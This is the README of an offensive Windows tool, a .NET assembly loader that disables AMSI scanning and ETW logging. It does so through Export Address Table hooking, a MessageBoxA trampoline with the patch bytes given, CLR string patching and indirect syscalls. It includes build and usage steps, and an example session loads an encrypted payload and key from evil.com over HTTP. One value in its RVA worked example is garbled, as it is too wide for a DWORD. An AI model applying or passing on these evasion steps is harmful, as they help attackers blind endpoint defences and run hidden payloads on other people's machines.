# EATNetLoader - Advanced .NET Assembly Loader with EAT Hooking

## Overview

EATNetLoader is a sophisticated .NET assembly loader that utilizes Export Address Table (EAT) hooking techniques to bypass security controls. This tool demonstrates advanced memory manipulation techniques including EAT hooking, string patching, and indirect syscalls to evade detection by Endpoint Detection and Response (EDR) systems and Antimalware Scan Interface (AMSI).

## The Problem: Negative RVA in EAT Hooking

### The Challenge

When implementing EAT hooks for Windows libraries, a critical issue arises due to address space layout:

- **Windows library addresses** (e.g., `amsi.dll`, `advapi32.dll`) are loaded at relatively high memory addresses
- **Our dummy/hook functions** are typically located at lower memory addresses
- EAT uses **Relative Virtual Addresses (RVA)** stored as `DWORD/ULONG` (32-bit unsigned integers)

### The Root Cause

When attempting to redirect a Windows API function to our hook:

```
RVA = TargetFunctionAddress - LibraryBaseAddress
```

If our hook function's address is lower than the Windows API's address, the RVA becomes **negative**. However, since RVAs are stored as 32-bit unsigned integers (`DWORD`), this negative value gets truncated and wraps around to a large positive number. This causes the redirection to point to an incorrect memory location instead of our hook function.

This issue also explains why inline hooking approaches can sometimes cause crashes - the incorrect RVA leads to invalid code execution.

## The Solution: Trampoline Patching

### How It Works

The solution is elegant and effective:

1. **Create a Trampoline**: Patch a high-address Windows API function (e.g., `MessageBoxA`) to return immediately
2. **Use the Trampoline as Target**: Redirect the EAT entries to point to this patched function
3. **Leverage Address Space**: Since `MessageBoxA` is in user32.dll (high address), the RVA calculation yields a positive value

### Implementation Steps

1. **Patch MessageBoxA**: Replace the function prologue with:
   ```assembly
   mov rax, 1    ; Set return value to 1 (TRUE)
   ret           ; Return immediately
   ```
   Hex: `48 B8 01 00 00 00 00 00 00 00 C3`

2. **Redirect EAT Entries**:
   - Hook `advapi32.dll!EventWrite` → `user32.dll!MessageBoxA`

3. **Calculate RVAs**:
   ```c
   RVA = (ULONG)(MessageBoxA_Address - LibraryBaseAddress)
   ```

### Why This Works

- MessageBoxA resides at a high address in user32.dll
- The RVA calculation produces a positive, valid value
- EDR monitoring typically focuses on specific functions, not MessageBoxA
- The trampoline provides a safe return point that won't trigger alerts

## Features

### 1. EAT Hooking
- **amsi.dll!AmsiScanBuffer** - Bypass AMSI scanning
- **advapi32.dll!EventWrite** - Disable ETW (Event Tracing for Windows) logging

### 2. CLR String Patching
- Patches the "AmsiScanBuffer" string in clr.dll
- Prevents .NET runtime from referencing AMSI functionality
- Uses indirect syscalls for stealth

### 3. Indirect Syscalls
- Implements syscall resolution via the Exception Directory
- Hardware breakpoint-based syscall execution
- Bypasses user-mode API hooking by EDR
- Supports 30+ Windows API functions

### 4. Remote Payload Loading
- Supports loading .NET assemblies from local files
- Supports remote HTTP downloads
- AES-256 decryption for encrypted payloads
- Works with both .NET Framework 2.0 and 4.0 assemblies

### 5. Communication Channel
- Uses mailslots for capturing .NET assembly output
- Preserves stdout/stderr for debugging
- Clean handle management

## Technical Architecture

### Project Structure

```
EAThookNetLoaderEXE/
├── EAThookNetLoaderEXE.c      # Main loader implementation
├── HookModule.c                # Hardware breakpoint syscall infrastructure
├── FuncWrappers.c              # Wrapped syscall functions
├── HookModule.h                # Hook module definitions
├── FuncWrappers.h              # Function wrapper declarations
└── imports.h                   # Dynamic import definitions
```

### Key Components

#### 1. EAT Hook Implementation
```c
VOID EAT_HOOK(char* ModName, char* FunName, ULONG64 ProxyFunAddr)
```
- Parses PE export directory
- Locates target function by name
- Replaces function RVA in the Export Address Table
- Uses `NtWriteVirtualMemory` via indirect syscalls

#### 2. Trampoline Setup
```c
BOOL PatchMsgboxA()
```
- Patches `MessageBoxA` with `mov rax, 1; ret`
- Uses memory protection bypass via `NtProtectVirtualMemory`
- Creates a safe return point for hooked functions

#### 3. AMSI Bypass
```c
BOOL PatchAMSI()
```
- Searches for "AmsiScanBuffer" string in clr.dll memory
- Patches the string to zero-length
- Prevents .NET from initializing AMSI scanning

#### 4. Indirect Syscall Engine
```c
int GetSsnByName(PCHAR syscall)
void SetHwBp(ULONG_PTR FuncAddress, int flag, int ssn)
```
- Resolves System Service Numbers (SSN) dynamically
- Uses hardware breakpoints (DR0, DR1) for interception
- Emulates syscall execution at kernel level
- Supports extended arguments (up to 12 parameters)

## Building

### Prerequisites
- Visual Studio 2019 or later
- Windows SDK
- C/C++ build tools

### Build Steps

1. **Open Solution**
   ```
   EAThookNetLoaderEXE.sln
   ```

2. **Select Configuration**
   - Debug or Release
   - x64 platform

3. **Build Solution**
   - Right-click project → Build
   - Or press `Ctrl+Shift+B`

4. **Output**
   - `x64/Debug/EAThookNetLoaderEXE.exe` (Debug)
   - `x64/Release/EAThookNetLoaderEXE.exe` (Release)

## Usage

### Basic Usage

```bash
EAThookNetLoaderEXE.exe
```

The loader will prompt for:

1. **Shellcode/Assembly File** - Path or URL to the .NET assembly
   - Local file: `C:\path\to\assembly.exe`
   - Remote file: `http://example.com/payload.bin`

2. **Decryption Key** - Key for AES-256 decryption
   - Default: "Voldemort"

3. **Arguments** - Command-line arguments to pass to the assembly
   - Press Enter for no arguments

### Example Session

```
[+] Please Input Shellcode File here!
C:\payloads\encrypted.bin
[+] Loading file C:\payloads\encrypted.bin
[+] Loading key Voldemort
[+] Please Add your argument here! If no argument just simply press enter to pass.

[+] Arguments: 
[*] Ntdll Start Address: 0x180000000
[*] Ntdll End Address: 0x1801c6000
[+] Found MessageBoxA address in 0x7ffe8a501230
[+] Address of EventWrite before hook: 0x7ffe8a102000
[+] Eat hook Success!!!
[+] Address of EventWrite after hook: 0x7ffe8a501230
[+] Start loading assembly! Please wait for the ouput.
[+] Found AmsiScanBuffer address in 0x7ffe8b401000
[+] Eat hook Success!!!

[Assembly Output Here]

[+] Cleaned up the breakpoint and CLR created.
```

### HTTP Remote Loading

```
[+] Please Input Shellcode File here!
http://evil.com/payload.bin
[+] Loading file http://evil.com/payload.bin
[+] Loading key http://evil.com/key.txt
```

## Security Considerations

### Detection Evasion Techniques

1. **EAT Hooking** - Modifies export table instead of inline hooks
2. **Indirect Syscalls** - Bypasses user-mode API monitoring
3. **Hardware Breakpoints** - Uses debug registers instead of software patches
4. **String Obfuscation** - All strings are de-obfuscated at runtime
5. **Dynamic API Resolution** - No static imports of sensitive APIs
6. **Trampoline Pattern** - Uses legitimate Windows API as return point

### EDR Monitoring

Based on testing:
- EDR systems typically monitor patching of specific security functions
- Patching `MessageBoxA` does not trigger alerts in most configurations
- Memory modifications are performed via indirect syscalls
- Short-lived patches during execution are less likely to be detected

### Limitations

- Requires 64-bit Windows
- Requires .NET Framework (v2.0 or v4.0) installed
- Some EDR solutions may monitor EAT modifications
- Kernel-mode EDR can still detect these techniques

## Technical Deep Dive

### RVA Calculation Example

```c
// Before fix (Problem)
LibraryBase = 0x7ffe8a100000  // advapi32.dll
TargetFunction = 0x7ffe8a102000 // EventWrite
DummyFunction = 0x140005000     // Our hook (lower address)

RVA = 0x140005000 - 0x7ffe8a100000 = -0x7FFE4A0FB000 (negative!)
// Stored as DWORD: 0x8001B5F0500 (incorrect positive value)

// After fix (Solution)
LibraryBase = 0x7ffe8a100000  // advapi32.dll
TargetFunction = 0x7ffe8a102000 // EventWrite
MessageBoxA = 0x7ffe8a501230  // Trampoline (higher address)

RVA = 0x7ffe8a501230 - 0x7ffe8a100000 = 0x401230 (positive!)
// Correct RVA stored: 0x401230
```

### Hardware Breakpoint Syscall Flow

```
1. Trigger access violation at ntdll!NtProtectVirtualMemory
2. Exception handler captures syscall entry point
3. Set hardware breakpoints at syscall and ret instructions
4. On syscall breakpoint:
   - Save context
   - Modify RIP to execute custom logic
   - Set trace flag (EFlags.TF)
5. Trace execution until safe frame found
6. Restore context and invoke intended syscall with resolved SSN
7. Return to original caller
```

## Credits

This project demonstrates advanced techniques for EDR evasion and security research. The trampoline pattern for EAT hooking addresses a fundamental limitation in hooking Windows APIs from lower memory regions.

## Disclaimer

This tool is for **educational and research purposes only**. Use responsibly and only in environments where you have explicit authorization. The authors are not responsible for any misuse of this software.

## References

- Inline-ea - https://github.com/EricEsquivel/Inline-EA
- RustPatchlessCLRLoader - https://github.com/c2pain/RustPatchlessCLRLoader/tree/main
- eat hook - https://github.com/aurexav/hook-in-rust/tree/master/messagebox-eat-hook
